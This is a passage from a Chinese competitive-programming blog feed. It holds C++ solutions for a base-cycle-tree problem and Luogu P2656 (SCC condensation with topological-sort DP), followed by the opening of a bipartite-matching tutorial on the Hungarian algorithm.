条边。而对于一棵树而言，对它深度优先搜索一定会遍历树上所有的边。因此如果把基环树拆开称为一个环和若干个子树，我们就只需要在环上讨论情况，子树的所有边一定是都会走过的。对于同一个环，我先向右边遍历和先向左边遍历走的路径是完全不一样的，如果先向右边那必然导致它左边不会被走过，同理先走左边那右边就不会被走过。</p><p>再根据题中的策略，对于环上的点，我们只需要循环一遍环上的所有点，观察与它连接的在环上的边的美观度哪个比较大，那么答案就是所有图的边权减去那个美观度较小的边权。对于不在环上的点我们可以观察它所在的子树连接在环的哪个点，因为从那个点遍历出来最终也会从它所在的子树走向环的那个点，然后情况就变成了在换上对应的点遍历的情况了。</p><p>所以我们先大致描述一下算法流程：</p><ul><li>将边按照出点读入 $vector$ 当中，并且按美观度排序</li><li>dfs 跑出环上的点将其标记</li><li>对环上所有的点进行答案计算</li><li>对环上的点再跑一次dfs，然后搜索策略为非环上的点，将搜索到的点标记为环上对应的那个点</li><li>最后答案就出来了</li></ul><h2 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 3000005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">    <span class="keyword">int</span> p;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> visited[maxn],ans[maxn],n;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> sum_len,res[maxn];<span class="comment">//不开long long见祖宗</span></span><br><span class="line">vector&lt;eee&gt;edge[maxn];<span class="comment">//用vector数组保存边方便排序</span></span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;s;<span class="comment">//保存环上的点</span></span><br><span class="line"><span class="keyword">bool</span> in_stack[maxn];<span class="comment">//因为我原来使用栈保存的因此命名这个，表示点是否在环上</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w,<span class="keyword">int</span> p)</span></span>&#123;</span><br><span class="line">    eee e;</span><br><span class="line">    e.to=y;</span><br><span class="line">    e.w=w;</span><br><span class="line">    e.p=p;</span><br><span class="line">    edge[x].<span class="built_in">push_back</span>(e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(eee a,eee b)</span></span>&#123;<span class="comment">//按美观度排序</span></span><br><span class="line">    <span class="keyword">return</span> a.p&gt;b.p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u,<span class="keyword">int</span> pre)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(visited[u])&#123;<span class="comment">//如果搜索到了被标记过的点则说明遇到环了</span></span><br><span class="line">        <span class="keyword">return</span> u;</span><br><span class="line">    &#125;</span><br><span class="line">    visited[u]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> value=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> it=edge[u].<span class="built_in">begin</span>();it!=edge[u].<span class="built_in">end</span>();it++)&#123;</span><br><span class="line">        <span class="keyword">int</span> v=it-&gt;to;</span><br><span class="line">        <span class="keyword">if</span>(v==pre||in_stack[v])<span class="keyword">continue</span>;<span class="comment">//防止逆搜索，并防止对环重新搜索</span></span><br><span class="line">        <span class="comment">//从环的起点开始，假如我顺时针跑出了环，那么它下一条边将会逆时针跑环</span></span><br><span class="line">        <span class="comment">//可以看到仅仅限制条件v!=pre是远远不够的。</span></span><br><span class="line">        <span class="keyword">int</span> tmp=<span class="built_in">dfs</span>(v,u);</span><br><span class="line">        <span class="keyword">if</span>(tmp)&#123;<span class="comment">//若返回结果不为0则说明遇到环，并且本点也在换上，就保存。</span></span><br><span class="line">            value=tmp;</span><br><span class="line">            <span class="keyword">if</span>(value==u)&#123;</span><br><span class="line">                <span class="comment">//我判断出环的那个点一定是环的起点，如果回溯过程中遇到了说明环已经保存完了</span></span><br><span class="line">                <span class="comment">//再往前回溯的点就不属于环了</span></span><br><span class="line">                value=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            s.<span class="built_in">push_back</span>(u);</span><br><span class="line">            in_stack[u]=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs2</span><span class="params">(<span class="keyword">int</span> u,<span class="keyword">int</span> pre,<span class="keyword">int</span> flag)</span></span>&#123;<span class="comment">//这里搜索环的子树，将子树上所有点标记为子树与环直接相连的一个点</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> it=edge[u].<span class="built_in">begin</span>();it!=edge[u].<span class="built_in">end</span>();it++)&#123;</span><br><span class="line">        <span class="keyword">int</span> v=it-&gt;to;</span><br><span class="line">        <span class="keyword">if</span>(v==pre||in_stack[v])<span class="keyword">continue</span>;<span class="comment">//这里我们排除环上的点遍历的一定就都是子树</span></span><br><span class="line">        ans[v]=flag;<span class="comment">//ans保存本点答案与哪个点的答案一致。</span></span><br><span class="line">        <span class="built_in">dfs2</span>(v,u,flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    std::ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    <span class="comment">//freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y,w,p;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;w&gt;&gt;p;</span><br><span class="line">        <span class="built_in">add</span>(x,y,w,p);</span><br><span class="line">        <span class="built_in">add</span>(y,x,w,p);</span><br><span class="line">        sum_len+=w;<span class="comment">//读入边，将边权之和保存。</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">sort</span>(edge[i].<span class="built_in">begin</span>(),edge[i].<span class="built_in">end</span>(),cmp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">dfs</span>(<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> i=s.<span class="built_in">begin</span>();i!=s.<span class="built_in">end</span>();i++)&#123;<span class="comment">//给子树标记</span></span><br><span class="line">        <span class="built_in">dfs2</span>(*i,<span class="number">0</span>,*i);</span><br><span class="line">        ans[*i]=*i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> i=s.<span class="built_in">begin</span>();i!=s.<span class="built_in">end</span>();i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> j=edge[*i].<span class="built_in">end</span>()<span class="number">-1</span>;j!=edge[*i].<span class="built_in">begin</span>()<span class="number">-1</span>;j--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(in_stack[j-&gt;to])&#123;<span class="comment">//因为我们是按照美观度从大到小排序的，所以从后面开始找到第一个在环上的点一定是美观度较小的边，答案就是减去美观度较小的边权。</span></span><br><span class="line">                res[*i]=sum_len-(j-&gt;w);<span class="comment">//res数组保存答案</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,res[ans[i]]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 图论 </category>
          
          <category> 基环树 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>洛谷P2656题解</title>
      <link href="/2022/02/07/%E6%B4%9B%E8%B0%B7P2656%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/02/07/%E6%B4%9B%E8%B0%B7P2656%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.luogu.com.cn/problem/P2656">洛谷P2656</a>题解。</p><span id="more"></span><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>小胖和 ZYR 要去 ESQMS 森林采蘑菇。</p><p>ESQMS 森林间有 N个小树丛，M 条小径，每条小径都是单向的，连接两个小树丛，上面都有一定数量的蘑菇。小胖和 ZYR 经过某条小径一次，可以采走这条路上所有的蘑菇。由于 ESQMS 森林是一片神奇的沃土，所以一条路上的蘑菇被采过后，又会长出一些新的蘑菇，数量为原来蘑菇的数量乘上这条路的“恢复系数”，再下取整。</p><p>比如，一条路上有 4个蘑菇，这条路的“恢复系数”为 0.70，则第一~四次经过这条路径所能采到的蘑菇数量分别为 4,2,1,0。</p><p>现在，小胖和 ZYR 从 S号小树丛出发，求他们最多能采到多少蘑菇。</p><hr><p>就是沿线采蘑菇，然后给定起点，没有给终点，蘑菇采完后会复活，复活的个数为上一次的个数×恢复系数。路是单向的，那么可以据此建一个有向图。如果一条边的两个顶点在同一个强连通分量内的话，那么这条边我可以经过无数次，这很容易证明。但是如果一条边的两个点不在同一个强连通分量，那么我只能采一次上面的蘑菇。因为题目没有规定不能反复横跳，所以我们可以先tarjan缩点然后把内部的边权集中到点上，再集中的时候只需要注意一定是要×系数累加上去的，因为我能无数次经过。</p><p>缩点之后就是对DAG处理，我看大佬们用的都是最短路径算法，这里菜鸡只会拓扑排序qwq。</p><p>这里还需要注意的是，起点所在的强连通分量如果入读不为0那么那些蘑菇我是采不到的。因此我在这里设立一个flag标记，在拓扑排序的时候如果flag为0那么我只把点和边删了，不做数值上的处理。然后我对起点所在的强连通分量flag设1，然后如果flag为1则会向后面的点传递。</p><p>在写状态转移方程的时候注意要把路上的蘑菇和那个点的蘑菇都加上。</p><p>如果路径上的蘑菇为w，v强连通分量上的蘑菇数为$amount[v]$。那么$u-&gt;v$的状态转移方程就应该是</p><p>$ans[v]=max(ans[v],ans[u]+w+amount[v])$</p><p>最后注意一个，那就是一定要记着不管怎样给最终结果赋一个初始值就是起点所在强连通分量的蘑菇数量，这里卡了一下。</p><p>下面给出AC代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 80005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">    <span class="keyword">float</span> p;</span><br><span class="line">&#125;edge[maxn*<span class="number">3</span>],e[maxn*<span class="number">3</span>];</span><br><span class="line"><span class="keyword">int</span> root[maxn],root2[maxn],dfn[maxn],low[maxn],visited[maxn],s[maxn],degree[maxn],num[maxn],amount[maxn],ans[maxn],flag[maxn],cnt,cnt2,tot,top,deep,n,m;</span><br><span class="line">stack&lt;<span class="keyword">int</span>&gt;ss;<span class="comment">//拓扑排序用的栈</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w,<span class="keyword">float</span> p)</span></span>&#123;<span class="comment">//一开始的建图</span></span><br><span class="line">    edge[++cnt].to=y;</span><br><span class="line">    edge[cnt].w=w;</span><br><span class="line">    edge[cnt].next=root[x];</span><br><span class="line">    edge[cnt].p=p;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add2</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w,<span class="keyword">float</span> p)</span></span>&#123;<span class="comment">//强连通分量的建图</span></span><br><span class="line">    degree[y]++;</span><br><span class="line">    e[++cnt2].next=root2[x];</span><br><span class="line">    e[cnt2].to=y;</span><br><span class="line">    e[cnt2].w=w;</span><br><span class="line">    e[cnt2].p=p;</span><br><span class="line">    root2[x]=cnt2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tarjan</span><span class="params">(<span class="keyword">int</span> u)</span></span>&#123;<span class="comment">//tarjan板子</span></span><br><span class="line">    visited[u]=<span class="number">1</span>;</span><br><span class="line">    dfn[u]=low[u]=++deep;</span><br><span class="line">    s[++top]=u;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> v=edge[i].to;</span><br><span class="line">        <span class="keyword">if</span>(!dfn[v])&#123;</span><br><span class="line">            <span class="built_in">tarjan</span>(v);</span><br><span class="line">            low[u]=<span class="built_in">min</span>(low[u],low[v]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(visited[v])&#123;</span><br><span class="line">            low[u]=<span class="built_in">min</span>(low[u],low[v]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(dfn[u]==low[u])&#123;</span><br><span class="line">        visited[u]=<span class="number">0</span>;</span><br><span class="line">        num[u]=++tot;</span><br><span class="line">        <span class="keyword">while</span>(s[top]!=u)&#123;</span><br><span class="line">            visited[s[top]]=<span class="number">0</span>;</span><br><span class="line">            num[s[top--]]=tot;</span><br><span class="line">        &#125;</span><br><span class="line">        top--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;1.txt&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x, y, w;</span><br><span class="line">        <span class="keyword">float</span> p;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;w&gt;&gt;p;</span><br><span class="line">        <span class="built_in">add</span>(x,y,w,p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> start;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;start);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!dfn[i])<span class="built_in">tarjan</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=root[i];j;j=edge[j].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> v=edge[j].to,w=edge[j].w;</span><br><span class="line">            <span class="keyword">float</span> p=edge[j].p;</span><br><span class="line">            <span class="keyword">if</span>(num[i]==num[v])&#123;<span class="comment">//同一个强连通分量内则把所有能产生的蘑菇加上</span></span><br><span class="line">                <span class="keyword">while</span>(w!=<span class="number">0</span>)&#123;</span><br><span class="line">                    amount[num[i]]+=w;</span><br><span class="line">                    w=(<span class="keyword">int</span>)((p)*w);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">add2</span>(num[i],num[v],w,p);<span class="comment">//否则建边</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=tot;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!degree[i])ss.<span class="built_in">push</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    ans[num[start]]=amount[num[start]];</span><br><span class="line">    flag[num[start]]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> res=ans[num[start]];<span class="comment">//res一定赋初值不要忘了</span></span><br><span class="line">    <span class="keyword">while</span>(!ss.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> x=ss.<span class="built_in">top</span>();</span><br><span class="line">        ss.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=root2[x];i;i=e[i].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> v=e[i].to,w=e[i].w;</span><br><span class="line">            degree[v]--;</span><br><span class="line">            <span class="keyword">if</span>(!degree[v])ss.<span class="built_in">push</span>(v);</span><br><span class="line">            <span class="keyword">if</span>(flag[x])&#123;</span><br><span class="line">                ans[v]=<span class="built_in">max</span>(ans[v],ans[x]+w+amount[v]);<span class="comment">//状态转移方程</span></span><br><span class="line">                res=<span class="built_in">max</span>(res,ans[v]);<span class="comment">//保存结果</span></span><br><span class="line">                flag[v]=<span class="number">1</span>;<span class="comment">//flag向前传播</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(tot==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,ans[<span class="number">1</span>]);</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,res);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 图论 </category>
          
          <category> 强连通分量、缩点 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>二分图入门</title>
      <link href="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/"/>
      <url>/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<p>然后今天来学二分图，首先我们来看看二分图的定义。</p><span id="more"></span><h2 id="二分图的定义"><a href="#二分图的定义" class="headerlink" title="二分图的定义"></a>二分图的定义</h2><p>首先二分图它是一个图(G)，由点集(V)和边集(E)构成的集合，即<code>G=(V,E)</code>。</p><p>除此之外它还满足一个特点，若这个图的点集存在一个<strong>划分</strong><code>&#123;V1,V2&#125;</code>使得，任意的<code>e(i,j,w)∈E</code>满足关系，<code>i∈V1,j∈V2</code>或者是<code>i∈V2,j∈V1</code>。那么这个图就被称为一个二分图。</p><p>以上是比较数学的说法，而且是自己DIY的(狗头。那说人话就是说，如果你能找到一个合理的方式把点划成两个部分，使得每条边的两个顶点均不同时属于一个部分。那么它就是一个二分图。反之，如果不存在这样的划分满足以上结果，那么它就不是一个二分图。</p><p>二分图的一个等价定义是：不含有<strong>含奇数条边的环</strong>的图。</p><p>如果说了这么多让你感觉到还是有一点点难以理解的话，那么我们换一个思路：假设把人比作点，把相爱关系比作边。假设这个人群内没有舔狗(恋情非单向)和男酮，那么它们的关系组成的图就会是一个二分图。时间管理大师(一人同时与多人)不影响它还是一个二分图的，只要没有同就行。不知道这个例子是否够抽象，更易于理解。</p><p>举个例子，如下图，它是不是一个二分图？</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/1.png" alt="1"></p><p>判断二分图可以用它的性质，显而易见的性质是什么：边连接的两个点一定属于不同集合。用刚刚那个例子再去讲的话就是：没有同的情况下，喜欢男孩的一定都是女孩，而这里我们划分就是以男孩女孩作为依据划分的，接着往下推又可以得到：喜欢<strong>喜欢男孩的人</strong>的人一定也是男孩。这里我们从1开始，假设1为男，那么5，7必为女，2，8，3必为男，6，4必为女。</p><p>我们就可以得到划分：<code>&#123;&#123;1,2,3,8&#125;,&#123;4,5,6,7&#125;&#125;</code>。那么我们稍微画的明显一点，将两个划分独立为两排，得到了以下图。</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/2.png" alt="2"></p><p>为了方便，我们一般都会把二分图化成这种形式，可以很清楚的发现，同一排之间的点没有连线。那么你现在一定对二分图有了一个较为清楚的认识，那么可能会疑惑，这样的数据结构能用来处理什么样的问题呢？那么就涉及到我们接下来讲的概念了。</p><h2 id="一些概念"><a href="#一些概念" class="headerlink" title="一些概念"></a>一些概念</h2><ol><li>匹配(matching)：匹配其实就是一个边的集合，任意两条属于匹配的边都没有公共顶点，那么这个集合就叫做这个图的一个匹配。</li><li>匹配点：如果这个点存在于这个匹配的任意一条边上，那么这个点就是一个匹配点。</li><li>匹配边：如果这个边属于这个匹配，那么这就是一个匹配边。</li><li>非匹配点：与匹配点相对</li><li>非匹配边：与匹配边相对</li><li>最大匹配：在所有匹配中，所含边数量最多的称为最大匹配。</li><li>完美匹配：如果一个匹配中的所有边包含了一个图的所有点，即，一个图当中所有的点都为匹配点时，这个匹配称为完美匹配，并非所有的图都含有完美匹配，完美匹配一定是最大匹配。</li></ol><h3 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h3><p>比如还是上面这个图，假设它们就是四男四女，我们要怎样做，才能尽可能保证它们都和自己喜欢的人凑成一对呢？这实际上就是要求二分图的最大匹配了，最大匹配我们一般是用匈牙利算法，对于匈牙利算法，我们需要再补充一点概念。</p><ol><li>交替路：如果从一个非匹配点出发，依次经过匹配边，非匹配边，匹配边，非匹配边……形成的路径就叫交替路。</li><li>增广路：如果交替路的终点为一个非匹配点，那么这条交替路我们又叫增广路。</li></ol><p>如下图</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/3.png" alt="3"></p><p>红色点和红色边为匹配点和匹配边，这是一条增广路。</p><p>增广路的性质就是非匹配边会比匹配边多一条。如果我们把匹配边和非匹配边交换顺序，那么将会得到</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/4.png" alt="4"></p><p>可以到相比之前多了一个匹配边和两个匹配点。但是匹配顺序完全不一样了，原来是2，3匹配，4，5匹配，现在2，3和4，5都不在同一条匹配边上。</p><p>匈牙利算法的本质就是不停寻找增广路，增加匹配数目的。我们先不考虑匈牙利算法的代码，先徒手做一遍。首先我们需要匹配的点只有一边，另一边是被匹配的。</p><p>如最开始那个图，</p><p>从1开始，遍历边，先看1，5，发现5未被匹配，则直接匹配，结束。</p><p>那么现在的图是这样的。</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/5.png" alt="5"></p><p>从2开始，2未被匹配，则寻找与它相连的边，找到(2,5)，但是发现5已经被匹配了，这个时候就要用到寻找增广路的思维了。那么我们直接沿着匹配边搜寻，就找到了1，然后从1开始找相连的边，因为不能反复横跳，所以我们只能选择7，发现7没被匹配，因此2-5-1-7构成增广路，找到增广路之后代表首位两个点参与进了匹配。然后交换匹配边与非匹配边。成了这样</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/6.png" alt="6"></p><p>这里我们不考虑最好的情况，因为我们自己很清楚3，6匹配，4，8匹配直接就完结撒花了。但是计算机不一定按照这样的方式去遍历，你要保证先后顺序不影响最终结果，即就算你选择5，最终算出来的最大匹配应当也是4。</p><p>这里我们选5，发现5被匹配了，于是找到2，但是2之后再也找不到路径了，因此(3,5)方向上的增广路寻找失败，所以就会找(3,6)，(3,6)直接匹配，我们看看最后这个8会怎么样呢，我们假设也是先找到了7，7会找到1，1会找到5，5找到2，发现2找不到增广路了，返回失败。所以最终选择了(8,4)。那么这样一整个就是匈牙利算法了。</p><p>这里用C代码大概写一下，假设存图采用链式前向星。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 